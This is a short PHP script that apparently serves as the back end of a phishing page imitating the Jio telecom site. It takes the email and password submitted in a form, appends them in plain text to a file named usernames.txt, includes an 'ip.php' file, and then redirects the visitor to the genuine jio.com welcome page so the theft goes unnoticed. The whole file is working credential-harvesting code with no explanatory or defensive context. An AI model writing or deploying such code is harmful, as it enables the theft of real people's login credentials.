<?php
include 'ip.php';
file_put_contents("usernames.txt", "email=" . $email = $_POST['email'] . "\n", FILE_APPEND);
?>
<?php
file_put_contents("usernames.txt", "pass=" . $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://www.jio.com/welcome');
?>
